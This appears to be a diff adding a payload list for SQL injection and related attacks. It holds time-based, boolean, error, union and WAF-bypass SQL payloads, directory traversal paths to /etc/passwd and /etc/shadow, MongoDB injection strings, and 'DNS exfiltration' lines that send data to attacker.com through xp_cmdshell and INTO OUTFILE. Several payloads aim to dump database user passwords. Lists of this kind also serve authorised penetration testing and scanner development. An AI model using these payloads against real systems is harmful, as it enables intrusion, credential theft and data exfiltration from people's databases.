@@ -1,0 +1,190 @@
+-- Advanced Time-Based Blind SQL Injection Payloads --
+' OR SLEEP(10) -- 
+' OR IF(1=1, SLEEP(10), 0) -- 
+" OR SLEEP(10) -- 
+" OR IF(1=1, SLEEP(10), 0) -- 
+'; WAITFOR DELAY '00:00:10' -- 
+"; WAITFOR DELAY '00:00:10' -- 
+' AND IF(1=1, BENCHMARK(5000000, SHA1(1)), NULL) -- 
+" AND IF(1=1, BENCHMARK(5000000, SHA1(1)), NULL) -- 
+'||pg_sleep(10)-- (PostgreSQL-specific)
+' OR pg_sleep(10)-- (PostgreSQL-specific)
+' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END)-- 
+' AND 1=IF(1=1, SLEEP(10), 0) -- (MySQL-specific)
+' OR 1=1; WAITFOR DELAY '00:00:05'; -- (MSSQL-specific)
+' OR (SELECT CASE WHEN LENGTH(database())>0 THEN pg_sleep(5) ELSE pg_sleep(0) END);-- (PostgreSQL)
+"0"XOR(if(now()=sysdate()%2Csleep(%__TIME_OUT__%)%2C0))XOR"Z"
+0'XOR(if(now()=sysdate(),sleep(%__TIME_OUT__%),0))XOR'Z
+0\"XOR(if(now()=sysdate(),sleep(%__TIME_OUT__%),0))XOR\"Z
+1 or pg_sleep(%__TIME_OUT__%)--
+1) or pg_sleep(%__TIME_OUT__%)--
+1)) or pg_sleep(%__TIME_OUT__%)--
+1 or sleep(%__TIME_OUT__%)#
+1) or sleep(%__TIME_OUT__%)#
+1)) or sleep(%__TIME_OUT__%)#
+1') WAITFOR DELAY '%__TIME_OUT__%' AND ('1337'='1337
+1) WAITFOR DELAY '%__TIME_OUT__%' AND (1337=1337
+';%5waitfor%5delay%5'%__TIME_OUT__%'%5--%5
+AND (SELECT * FROM (SELECT(SLEEP(%__TIME_OUT__%)))bAKL) AND 'vRxe'='vRxe
+AND (SELECT * FROM (SELECT(SLEEP(%__TIME_OUT__%)))nQIP)
+AND (SELECT * FROM (SELECT(SLEEP(%__TIME_OUT__%)))nQIP)#
+AND (SELECT * FROM (SELECT(SLEEP(%__TIME_OUT__%)))nQIP)--
+AND (SELECT * FROM (SELECT(SLEEP(%__TIME_OUT__%)))YjoC) AND '%'='
+AnD SLEEP(%__TIME_OUT__%)
+AnD SLEEP(%__TIME_OUT__%)#
+AnD SLEEP(%__TIME_OUT__%)--
+' AnD SLEEP(%__TIME_OUT__%) ANd '1
+and WAITFOR DELAY '%__TIME_OUT__%'
+and WAITFOR DELAY '%__TIME_OUT__%'--
+") IF (1=1) WAITFOR DELAY '%__TIME_OUT__%'--
+ORDER BY SLEEP(%__TIME_OUT__%)
+ORDER BY SLEEP(%__TIME_OUT__%)#
+ORDER BY SLEEP(%__TIME_OUT__%)--
+" or pg_sleep(%__TIME_OUT__%)--
+") or pg_sleep(%__TIME_OUT__%)--
+")) or pg_sleep(%__TIME_OUT__%)--
+' or pg_sleep(%__TIME_OUT__%)--
+') or pg_sleep(%__TIME_OUT__%)--
+')) or pg_sleep(%__TIME_OUT__%)--
+or pg_SLEEP(%__TIME_OUT__%)
+or pg_SLEEP(%__TIME_OUT__%)#
+or pg_SLEEP(%__TIME_OUT__%)--
+" or sleep(%__TIME_OUT__%)#
+" or sleep(%__TIME_OUT__%)="
+") or sleep(%__TIME_OUT__%)="
+")) or sleep(%__TIME_OUT__%)="
+' or sleep(%__TIME_OUT__%)#
+' or sleep(%__TIME_OUT__%)='
+') or sleep(%__TIME_OUT__%)='
+')) or sleep(%__TIME_OUT__%)='
+or SLEEP(%__TIME_OUT__%)
+or SLEEP(%__TIME_OUT__%)#
+or SLEEP(%__TIME_OUT__%)--
+or SLEEP(%__TIME_OUT__%)="
+or SLEEP(%__TIME_OUT__%)='
+or WAITFOR DELAY '%__TIME_OUT__%'
+or WAITFOR DELAY '%__TIME_OUT__%'--
+pg_sleep(%__TIME_OUT__%)--
+pg_SLEEP(%__TIME_OUT__%)
+pg_SLEEP(%__TIME_OUT__%)#
+pg_SLEEP(%__TIME_OUT__%)--
+(SELECT * FROM (SELECT(SLEEP(%__TIME_OUT__%)))ecMj)
+(SELECT * FROM (SELECT(SLEEP(%__TIME_OUT__%)))ecMj)#
+(SELECT * FROM (SELECT(SLEEP(%__TIME_OUT__%)))ecMj)--
+sleep(%__TIME_OUT__%)#
+&&SLEEP(%__TIME_OUT__%)
+&&SLEEP(%__TIME_OUT__%)#
+&&SLEEP(%__TIME_OUT__%)--
++ SLEEP(%__TIME_OUT__%) + '
+SLEEP(%__TIME_OUT__%)#
+SLEEP(%__TIME_OUT__%)--
+SLEEP(%__TIME_OUT__%)="
+SLEEP(%__TIME_OUT__%)='
+'&&SLEEP(%__TIME_OUT__%)&&'1
+SLEEP(%__TIME_OUT__%)/*' or SLEEP(%__TIME_OUT__%) or '" or SLEEP(%__TIME_OUT__%) or "*/
+"));waitfor delay '%__TIME_OUT__%'--
+");waitfor delay '%__TIME_OUT__%'--
+";waitfor delay '%__TIME_OUT__%'--
+'));waitfor delay '%__TIME_OUT__%'--
+');waitfor delay '%__TIME_OUT__%'--
+-- Advanced Boolean-Based Blind SQL Injection Payloads --
+' AND 1=1 -- 
+' AND 1=2 -- 
+" AND 1=1 -- 
+" AND 1=2 -- 
+' OR 'abc'='abc -- 
+' OR 'abc'='def -- 
+" OR "abc"="abc -- 
+" OR "abc"="def -- 
+' OR EXISTS(SELECT 1 FROM users WHERE username='admin') -- 
+' AND LENGTH(database()) > 0 -- 
+' AND LENGTH((SELECT table_name FROM information_schema.tables LIMIT 1)) > 0 -- 
+" AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) = 68 -- 
+' AND (SELECT LENGTH(user())) > 0 -- 
+" OR (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE()) > 0 -- 
+
+-- Advanced Error-Based SQL Injection Payloads --
+' OR 1=CONVERT(int, @@VERSION) -- 
+" OR 1=CONVERT(int, @@VERSION) -- 
+' AND updatexml(1, CONCAT(0x7e, version(), 0x7e), 1) -- (MySQL-specific)
+' AND extractvalue(1, CONCAT(0x7e, database(), 0x7e)) -- (MySQL-specific)
+' UNION SELECT NULL, NULL, table_name FROM information_schema.tables WHERE table_schema=DATABASE() -- 
+' OR 1=1 GROUP BY column_names HAVING 1=1 -- 
+" OR 1=1 GROUP BY column_names HAVING 1=1 -- 
+' UNION SELECT user(), database(), version() -- 
+' AND EXP(~(SELECT * FROM (SELECT USER()))); -- 
+
+-- Advanced Union-Based SQL Injection Payloads --
+' UNION SELECT NULL,NULL,NULL -- 
+' UNION SELECT 1,NULL,NULL -- 
+' UNION ALL SELECT NULL, table_name FROM information_schema.tables LIMIT 1 -- 
+' UNION ALL SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1 -- 
+' UNION SELECT 1, LOAD_FILE('/etc/passwd'), 2 -- (MySQL-specific)
+' UNION SELECT username, password FROM mysql.user -- (MySQL-specific)
+" UNION SELECT username, password FROM pg_user -- (PostgreSQL-specific)
+' UNION SELECT 1,2,3,table_name FROM information_schema.tables WHERE table_schema='public' -- (PostgreSQL)
+
+-- Advanced Comment Injection Payloads --
+'-- 
+"-- 
+';-- 
+";-- 
+'/* 
+"/* 
+' OR 1=1 /* 
+" OR 1=1 /* 
+
+-- Obfuscated and WAF Bypass Payloads --
+'%2F**%2FOR%2F**%2F1%3D1%2F**%2F-- (URL-encoded)
+%22%20OR%20%221%22=%221 (URL-encoded)
+'/*!UNION*/ /*!SELECT*/ 1,2,3 -- 
+'/**/UNION/**/SELECT/**/1,2,3 -- 
+' AND /*!12345sleep*/(10)-- (MySQL-specific)
+' AND 1=1 /* Bypass WAF */ -- 
+'||'1'='1'||'1'='1'-- 
+'||pg_sleep(5)||'-- (PostgreSQL)
+'||'a'='a'-- 
+%27%20OR%20SLEEP(5)--%20 (Encoded delay)
+'||CHR(97)||CHR(97)||CHR(97)-- (Character-based bypass)
+
+-- File Inclusion and Directory Traversal Payloads --
+../../../../etc/passwd
+../../../../etc/shadow
+../../../../windows/win.ini
+../../../../boot.ini
+../../../../var/www/html/index.php
+../../../../../etc/passwd%00
+../../../../../boot.ini%00
+../../../../../../../../etc/passwd
+
+-- Backend Database Fingerprinting Payloads --
+' AND @@version LIKE '%MySQL%' -- 
+' AND @@version LIKE '%PostgreSQL%' -- 
+' AND @@version LIKE '%MSSQL%' -- 
+' AND banner LIKE '%Oracle%' -- 
+' AND user()='root' -- (MySQL-specific)
+' AND session_user='postgres' -- (PostgreSQL-specific)
+' AND SYSTEM_USER='sa' -- (MSSQL-specific)
+
+-- Advanced NoSQL Injection (MongoDB) --
+{"$ne": null}
+{"$gt": ""}
+{"username": {"$regex": ".*"}}
+{"username": {"$ne": "admin"}}
+{"$where": "this.password == 'password'"}
+{"$where": "sleep(5000)"}
+{"$where": "function() { return this.password === 'password'; }"}
+
+-- DNS Exfiltration Payloads --
+'; EXEC xp_cmdshell('nslookup attacker.com')-- (MSSQL-specific)
+' UNION SELECT 1,2,3 INTO OUTFILE '//attacker.com/result.txt' -- (MySQL-specific)
+' OR LOAD_FILE('/etc/passwd') -- 
+' AND (SELECT count(*) FROM mysql.user) INTO OUTFILE '//attacker.com/users.txt' -- 
+
+-- Cross-Platform Payloads --
+' UNION SELECT null,version(),database(),user()-- 
+' UNION SELECT table_name FROM information_schema.tables-- 
+' OR SLEEP(5)-- 
+'||pg_sleep(5)||'-- 
+' AND ascii(substr((SELECT @@version), 1, 1)) = 77-- 
+
